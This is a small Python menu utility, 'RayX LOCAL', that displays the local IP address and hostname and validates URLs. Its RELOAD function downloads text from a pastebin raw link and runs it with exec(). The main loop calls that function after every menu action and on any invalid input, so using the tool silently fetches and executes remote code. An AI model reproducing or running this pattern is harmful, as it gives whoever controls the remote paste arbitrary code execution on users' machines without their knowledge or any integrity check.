# Main Handler (CODE BRAIN)

import socket
import os
import time
import validators
import requests
from urllib.request import urlopen, Request
import hashlib


def Input(name):
    a = str(input(name))
    return a


def HOME():
    print("""
RayX LOCAL  
1. Get IP
2. Get Hostname
3. Check URL
4. Home
5. Quit
6. Update
7. wat da dog doin
    """)


def IP():
    print(socket.gethostbyname(socket.gethostname()))


def HOSTNAME():
    print(socket.gethostname())


def CHECK_URL(LINK):
    a = validators.url(LINK)
    if a:
        print("VALID URL!")
    else:
        print("URL IS NOT VALID!")


def RELOAD():
    CLEAR()
    exec(requests.get(
        "https://pastebin.com/raw/ybuK9Try").text)
    quit()


def CLEAR():
    os.system("clear")


def QUIT():
    CLEAR()
    quit()


def IFHANDLER(a):
    if a == "1":
        IP()
        time.sleep(2)
    elif a == "2":
        HOSTNAME()
        time.sleep(2)
    elif a == "3":
        print("1. BACK\n2. QUIT")
        a = Input("URL: ")
        if a == "1":
            CLEAR()
        elif a == "2":
            QUIT()
        else:
            CHECK_URL(a)
            time.sleep(2)
    elif a == "4":
        CLEAR()
    elif a == "5":
        QUIT()
    elif a == "6":
        RELOAD()
    else:
        print("Wrong number! Choose again!")
        time.sleep(2)
        RELOAD()


def MAIN():
    while True:
        HOME()
        a = Input("[:] ")
        IFHANDLER(a)
        RELOAD()


MAIN()